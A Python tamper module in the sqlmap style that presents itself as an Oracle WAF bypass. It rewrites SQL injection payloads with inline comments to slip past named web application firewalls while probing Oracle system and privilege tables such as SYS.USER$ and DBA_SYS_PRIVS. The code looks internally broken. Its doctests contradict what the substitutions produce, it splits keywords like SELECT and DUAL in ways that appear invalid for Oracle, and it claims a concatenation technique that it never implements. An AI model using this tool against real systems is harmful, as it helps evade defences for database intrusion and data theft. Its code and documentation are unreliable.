#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Oracle WAF bypass tamper - obfuscates Oracle-specific keywords
    
    Requirement:
        * Oracle DBMS
    
    Tested against:
        * F5 BIG-IP ASM
        * Imperva SecureSphere
        * ModSecurity with Oracle rules
    
    Notes:
        * Obfuscates Oracle system tables and keywords
        * Uses Oracle-specific comment syntax
        * Breaks common WAF signatures for Oracle injection
    
    Techniques:
        * SYS.ALL_TABLES -> SYS./**/ALL_TABLES
        * FROM DUAL -> FROM/**/DUAL
        * ROWNUM -> ROW/**/NUM
        * Uses /**/ to break keyword detection
        * Uses || concatenation obfuscation
    
    >>> tamper("SELECT * FROM SYS.ALL_TABLES")
    "SELECT * FROM SYS./**/ALL_TABLES"
    >>> tamper("SELECT 1 FROM DUAL")
    "SELECT 1 FROM/**/DUAL"
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Oracle system objects - break with comments
    oracle_objects = [
        (r'SYS\.ALL_TABLES', 'SYS./**/ALL_TABLES'),
        (r'SYS\.ALL_TAB_COLUMNS', 'SYS./**/ALL_TAB_COLUMNS'),
        (r'SYS\.ALL_USERS', 'SYS./**/ALL_USERS'),
        (r'SYS\.USER\$', 'SYS./**/USER$'),
        (r'SYS\.DBA_', 'SYS./**/DBA_'),
        (r'ALL_TAB_COMMENTS', 'ALL_/**/TAB_COMMENTS'),
        (r'ALL_COL_COMMENTS', 'ALL_/**/COL_COMMENTS'),
        (r'ALL_TAB_COLUMNS', 'ALL_/**/TAB_COLUMNS'),
        (r'ALL_TABLES', 'ALL_/**/TABLES'),
        (r'ALL_USERS', 'ALL_/**/USERS'),
        (r'DBA_ROLE_PRIVS', 'DBA_/**/ROLE_PRIVS'),
        (r'DBA_SYS_PRIVS', 'DBA_/**/SYS_PRIVS'),
        (r'USER_SYS_PRIVS', 'USER_/**/SYS_PRIVS'),
        (r'USER_ROLE_PRIVS', 'USER_/**/ROLE_PRIVS'),
        (r'SESSION_PRIVS', 'SESSION_/**/PRIVS'),
        (r'SESSION_ROLES', 'SESSION_/**/ROLES'),
        (r'V\$VERSION', 'V$/**/VERSION'),
        (r'V\$SQL', 'V$/**/SQL'),
        (r'UTL_INADDR', 'UTL_/**/INADDR'),
    ]
    
    for pattern, replacement in oracle_objects:
        retVal = re.sub(pattern, replacement, retVal, flags=re.IGNORECASE)
    
    # Break DUAL keyword
    retVal = re.sub(r'\bFROM\s+DUAL\b', 'FROM/**/DUAL', retVal, flags=re.IGNORECASE)
    retVal = re.sub(r'\bDUAL\b', 'D/**/UAL', retVal, flags=re.IGNORECASE)
    
    # Break ROWNUM
    retVal = re.sub(r'\bROWNUM\b', 'ROW/**/NUM', retVal, flags=re.IGNORECASE)
    
    # Break common Oracle functions
    oracle_functions = [
        (r'\bSUBSTRC\s*\(', 'SUBSTR/**/C('),
        (r'\bASCII\s*\(', 'ASC/**/II('),
        (r'\bLENGTH\s*\(', 'LENG/**/TH('),
        (r'\bNVL\s*\(', 'NV/**/L('),
        (r'\bTO_NUMBER\s*\(', 'TO_/**/NUMBER('),
        (r'\bTO_CHAR\s*\(', 'TO_/**/CHAR('),
        (r'\bRAWTOHEX\s*\(', 'RAWTO/**/HEX('),
        (r'\bASCIISTR\s*\(', 'ASCII/**/STR('),
        (r'\bCAST\s*\(', 'CAS/**/T('),
    ]
    
    for pattern, replacement in oracle_functions:
        retVal = re.sub(pattern, replacement, retVal, flags=re.IGNORECASE)
    
    # Break SELECT/FROM/WHERE with random inline comments
    retVal = re.sub(r'\bSELECT\b', 'SEL/**/ECT', retVal, flags=re.IGNORECASE)
    retVal = re.sub(r'\bDISTINCT\b', 'DIS/**/TINCT', retVal, flags=re.IGNORECASE)
    retVal = re.sub(r'\bCOUNT\s*\(', 'COU/**/NT(', retVal, flags=re.IGNORECASE)
    
    return retVal
